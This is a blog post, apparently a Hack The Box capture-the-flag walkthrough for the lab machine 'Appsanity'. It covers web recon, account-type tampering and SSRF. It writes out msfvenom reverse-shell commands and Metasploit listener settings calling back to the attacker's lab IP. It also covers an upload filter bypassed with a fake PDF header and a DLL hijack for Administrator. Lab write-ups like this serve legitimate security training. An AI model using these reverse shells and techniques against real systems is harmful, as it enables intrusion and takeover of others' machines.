@@ -1,0 +1,129 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Appsanity | Foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Appsanity</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-11-04T16:59:25.000Z" id="date"> 2023-11-04</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-01-14T21:05:03.000Z" id="updated"> 2024-01-14</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; justify-content: center; align-items: center;">
+
+  <div style="margin-right: 20px;" class='item-img' data-src='appsanity.png'><img src="appsanity.png" title="Appsanity" width="300px" height="300px" style="pointer-events: none;">
+  </div>
+
+  <div style="display: flex; flex-direction: column; text-align: left;">
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">OS:</strong class='item-img' data-src='windows.png'><img src="windows.png" alt="Windows" width="20px" height="20px" style="margin-left: 5px;">
+      <span style="margin-left: 5px;">Windows</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Difficulty:</strong>
+      <span>Hard</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Author:</strong>
+      <span>xRogue</span>
+    </div>
+    <div style="display: flex; align-items: center;">
+      <strong style="margin-right: 5px;">Release Date:</strong>
+      <span>October 28, 2023</span>
+    </div>
+  </div>
+
+</div>
+
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sC -sV 10.10.11.238<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-04 00:09 WET<br>Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 0.00% <span class="hljs-keyword">done</span><br>Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 0.00% <span class="hljs-keyword">done</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.238<br>Host is up (0.059s latency).<br>Not shown: 998 filtered tcp ports (no-response)<br>PORT    STATE SERVICE VERSION<br>80/tcp  open  http    Microsoft IIS httpd 10.0<br>|_http-title: Did not follow redirect to https://meddigi.htb/<br>|_http-server-header: Microsoft-IIS/10.0<br>443/tcp open  https?<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 27.03 seconds<br><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="HTTPS-Page"><a href="#HTTPS-Page" class="headerlink" title="HTTPS Page"></a>HTTPS Page</h3><p>If we head to <a target="_blank" rel="noopener" href="https://10.10.11.238/">https://10.10.11.238</a> we can see that the domain is meddigi.htb<br>So we change the &#x2F;etc&#x2F;hosts file and check out the web page</p>
+<p>&#x2F;etc&#x2F;hosts<br class='item-img' data-src='/HTB/Appsanity/hosts1.png'><img src="/HTB/Appsanity/hosts1.png"></p>
+<p>Web Page<br class='item-img' data-src='/HTB/Appsanity/webpage1.png'><img src="/HTB/Appsanity/webpage1.png"></p>
+<p>It also allows us to create an account, and when we do, we can see that it creates a patient profile<br class='item-img' data-src='/HTB/Appsanity/patient.png'><img src="/HTB/Appsanity/patient.png"></p>
+<h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><p>If we run ffuf to look for subdomains, we find a ‘portal’ subdomain</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ffuf -u <span class="hljs-string">&quot;https://meddigi.htb/&quot;</span> -H <span class="hljs-string">&quot;Host: FUZZ.meddigi.htb&quot;</span>  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Appsanity/portal.png'><img src="/HTB/Appsanity/portal.png"></p>
+<p>Don’t forget to update the hosts file<br class='item-img' data-src='/HTB/Appsanity/hosts2.png'><img src="/HTB/Appsanity/hosts2.png"></p>
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="Doctor-Account"><a href="#Doctor-Account" class="headerlink" title="Doctor Account"></a>Doctor Account</h3><p>If we head to <a target="_blank" rel="noopener" href="https://portal.meddigi.htb/">https://portal.meddigi.htb</a>, we can see that we can login with an email and a Doctor Ref. Number<br class='item-img' data-src='/HTB/Appsanity/doctorlogin.png'><img src="/HTB/Appsanity/doctorlogin.png"></p>
+<p>To get a doctor account, we can capture the register request from when we create an account on the previous page, and change the account type<br class='item-img' data-src='/HTB/Appsanity/acctype.png'><img src="/HTB/Appsanity/acctype.png"></p>
+<p>Now if we login, we confirm that we have a Doctor account<br class='item-img' data-src='/HTB/Appsanity/doctoracc.png'><img src="/HTB/Appsanity/doctoracc.png"></p>
+<h3 id="Doctor-Panel"><a href="#Doctor-Panel" class="headerlink" title="Doctor Panel"></a>Doctor Panel</h3><p>Now we have a doctor account, but I did not find any “Doctor Ref.Number”<br>However, we can use the access_token cookie from meddigi.htb, to login in portal.meddigi.htb<br class='item-img' data-src='/HTB/Appsanity/access_token.png'><img src="/HTB/Appsanity/access_token.png"></p>
+<p>Now we have access to the Doctor Panel</p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>The “Issue Prescriptions” menu is vulnerable to SSRF on port 8080<br class='item-img' data-src='/HTB/Appsanity/ssrf1.png'><img src="/HTB/Appsanity/ssrf1.png"><br>It opens a report list, and allows us to open the report file<br class='item-img' data-src='/HTB/Appsanity/reportlist.png'><img src="/HTB/Appsanity/reportlist.png"></p>
+<p>If we copy the “View Report” link, the link looks like this:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://portal.meddigi.htb/ViewReport.aspx?file=eefeccb8-4c86-45b4-a38d-81754324a11b_Cardiology_Report_1.pdf">https://portal.meddigi.htb/ViewReport.aspx?file=eefeccb8-4c86-45b4-a38d-81754324a11b_Cardiology_Report_1.pdf</a></p>
+</blockquote>
+<h3 id="Uploading-RevShell"><a href="#Uploading-RevShell" class="headerlink" title="Uploading RevShell"></a>Uploading RevShell</h3><p>In the Doctor Panel there is also a “Upload Report” menu.<br>However it only allows us to upload PDF files.<br>We just need to create a .aspx reverse shell, and add the PDF header.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.2  LPORT=1337 -f aspx -o revshell.aspx<br></code></pre></td></tr></table></figure>
+<p>Now add the PDF header (%PDF-1.7%).<br class='item-img' data-src='/HTB/Appsanity/pdfheader.png'><img src="/HTB/Appsanity/pdfheader.png"></p>
+<p>With the header, it allows us to upload the report.<br>If we check the reports again using the SSRF found before, we can see the new report.<br class='item-img' data-src='/HTB/Appsanity/reportlist2.png'><img src="/HTB/Appsanity/reportlist2.png"></p>
+<p>Copy the “View Report” link and change the domain to <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a><br>It will look like something like this:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/ViewReport.aspx?file=9c934f73-3fea-4b65-af6c-d6d6a960a0ff_revshell.aspx">http://127.0.0.1:8080/ViewReport.aspx?file=9c934f73-3fea-4b65-af6c-d6d6a960a0ff_revshell.aspx</a></p>
+</blockquote>
+<h3 id="User-Shell"><a href="#User-Shell" class="headerlink" title="User Shell"></a>User Shell</h3><p>Finally, to get our first shell in the machine, we setup a meterpreter listener</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_https<br><span class="hljs-built_in">set</span> LHOST 10.10.14.2<br><span class="hljs-built_in">set</span> LPORT 1337<br><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br>run<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Appsanity/meterpreterlistener1.png'><img src="/HTB/Appsanity/meterpreterlistener1.png"></p>
+<p>Now we just place the link to open the shell in the “Issue Prescriptions” menu and we get a shell<br class='item-img' data-src='/HTB/Appsanity/ssrfshell1.png'><img src="/HTB/Appsanity/ssrfshell1.png"><br class='item-img' data-src='/HTB/Appsanity/meterpretersessionopen.png'><img src="/HTB/Appsanity/meterpretersessionopen.png"><br class='item-img' data-src='/HTB/Appsanity/session1.png'><img src="/HTB/Appsanity/session1.png"></p>
+<p>Now we just get the user.txt flag<br class='item-img' data-src='/HTB/Appsanity/userflag.png'><img src="/HTB/Appsanity/userflag.png"></p>
+<h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><h3 id="ReportManagement-exe"><a href="#ReportManagement-exe" class="headerlink" title="ReportManagement.exe"></a>ReportManagement.exe</h3><p>If we run netstat on the machine, we can see that there is a ReportManagement.exe running on port 100<br class='item-img' data-src='/HTB/Appsanity/netstat.png'><img src="/HTB/Appsanity/netstat.png"></p>
+<p>We can port forward the port 100 to a port on our local machine, I used port 12345 in this case<br class='item-img' data-src='/HTB/Appsanity/portforward.png'><img src="/HTB/Appsanity/portforward.png"><br>And we use netcat on our machine to check what the application does<br class='item-img' data-src='/HTB/Appsanity/ncreportmanagement.png'><img src="/HTB/Appsanity/ncreportmanagement.png"></p>
+<p>We will use this later</p>
+<h3 id="ExaminationManagement-dll"><a href="#ExaminationManagement-dll" class="headerlink" title="ExaminationManagement.dll"></a>ExaminationManagement.dll</h3><p>If we head to the directory </p>
+<blockquote>
+<p>C:\inetpub\ExaminationPanel\ExaminationPanel\bin</p>
+</blockquote>
+<p>We can see a ExaminationManagement.dll file, if we decompile it, we can find a registry key that retrieves while running.</p>
+<p>Download the .dll file<br class='item-img' data-src='/HTB/Appsanity/dlldownload1.png'><img src="/HTB/Appsanity/dlldownload1.png"></p>
+<p>Then I used dnSpy to decompile it, and we can find the registry key it accesses<br class='item-img' data-src='/HTB/Appsanity/dnspy.png'><img src="/HTB/Appsanity/dnspy.png"></p>
+<h3 id="devdoc-login"><a href="#devdoc-login" class="headerlink" title="devdoc login"></a>devdoc login</h3><p>In the meterpreter session, we can retrieve that registry key with the following command:</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">reg queryval -k HKLM\\Software\\MedDigi -v EncKey<br></code></pre></td></tr></table></figure>
+<p>And we get what looks like to be a password<br class='item-img' data-src='/HTB/Appsanity/devdocpassword.png'><img src="/HTB/Appsanity/devdocpassword.png"></p>
+<p>If we try that password on the following list of users<br class='item-img' data-src='/HTB/Appsanity/userlist.png'><img src="/HTB/Appsanity/userlist.png"></p>
+<p>It works on the user devdoc</p>
+<p class='item-img' data-src='/HTB/Appsanity/devdocshell.png'><img src="/HTB/Appsanity/devdocshell.png"></p>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="ReportManagement-exe-1"><a href="#ReportManagement-exe-1" class="headerlink" title="ReportManagement.exe"></a>ReportManagement.exe</h3><p>We start by reverse engineering the ReportManagement.exe file that was running on port 100<br>I downloaded the file and opened it in Ghidra<br class='item-img' data-src='/HTB/Appsanity/reportmanagementdownload.png'><img src="/HTB/Appsanity/reportmanagementdownload.png"></p>
+<p>In Ghidra we can see that it accesses the directory:</p>
+<blockquote>
+<p>C:\Program Files\ReportManagement\Libraries</p>
+</blockquote>
+<p class='item-img' data-src='/HTB/Appsanity/libraries.png'><img src="/HTB/Appsanity/libraries.png"></p>
+<p>And opens a file called “externalupload”<br class='item-img' data-src='/HTB/Appsanity/externalupload.png'><img src="/HTB/Appsanity/externalupload.png"></p>
+<h3 id="dll-RevShell"><a href="#dll-RevShell" class="headerlink" title=".dll RevShell"></a>.dll RevShell</h3><p>The externalupload file is a .dll file, and the user devdoc has permission to change the file.<br>So we create a .dll reverse shell, and when we run the upload function on the ReportManagement.exe application, we can get a shell</p>
+<p>First create the .dll revshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=1212 -f dll -o externalupload.dll<br></code></pre></td></tr></table></figure>
+
+<p>And upload it to the Libraries folder<br class='item-img' data-src='/HTB/Appsanity/uploadexternalupload.png'><img src="/HTB/Appsanity/uploadexternalupload.png"></p>
+<h3 id="Admin-Shell"><a href="#Admin-Shell" class="headerlink" title="Admin Shell"></a>Admin Shell</h3><p>Now that the reverse shell is uploaded, we start a meterpreter listener</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 10.10.14.2<br><span class="hljs-built_in">set</span> LPORT 1212<br><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br>run<br></code></pre></td></tr></table></figure>
+
+<p>We run the application that we port forwarded to our local machine and use the upload function<br class='item-img' data-src='/HTB/Appsanity/uploadfunction.png'><img src="/HTB/Appsanity/uploadfunction.png"></p>
+<p>And finally we have a shell as Administrator<br class='item-img' data-src='/HTB/Appsanity/adminsession1.png'><img src="/HTB/Appsanity/adminsession1.png"><br class='item-img' data-src='/HTB/Appsanity/adminsession2.png'><img src="/HTB/Appsanity/adminsession2.png"></p>
+<p>Now we just get the root.txt flag<br class='item-img' data-src='/HTB/Appsanity/rootflag.png'><img src="/HTB/Appsanity/rootflag.png"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Codify/">← Next [HTB] Codify</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/THM/RootMe/">[THM] RootMe Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'Foguh' Ferreira</a></h1><div id="description"><p>Junior PenTester</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTPS-Page"><span class="toc-number">1.2.</span> <span class="toc-text">HTTPS Page</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ffuf"><span class="toc-number">1.3.</span> <span class="toc-text">ffuf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Doctor-Account"><span class="toc-number">2.1.</span> <span class="toc-text">Doctor Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Doctor-Panel"><span class="toc-number">2.2.</span> <span class="toc-text">Doctor Panel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">2.3.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Uploading-RevShell"><span class="toc-number">2.4.</span> <span class="toc-text">Uploading RevShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Shell"><span class="toc-number">2.5.</span> <span class="toc-text">User Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">3.</span> <span class="toc-text">Lateral Movement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ReportManagement-exe"><span class="toc-number">3.1.</span> <span class="toc-text">ReportManagement.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ExaminationManagement-dll"><span class="toc-number">3.2.</span> <span class="toc-text">ExaminationManagement.dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#devdoc-login"><span class="toc-number">3.3.</span> <span class="toc-text">devdoc login</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ReportManagement-exe-1"><span class="toc-number">4.1.</span> <span class="toc-text">ReportManagement.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dll-RevShell"><span class="toc-number">4.2.</span> <span class="toc-text">.dll RevShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin-Shell"><span class="toc-number">4.3.</span> <span class="toc-text">Admin Shell</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
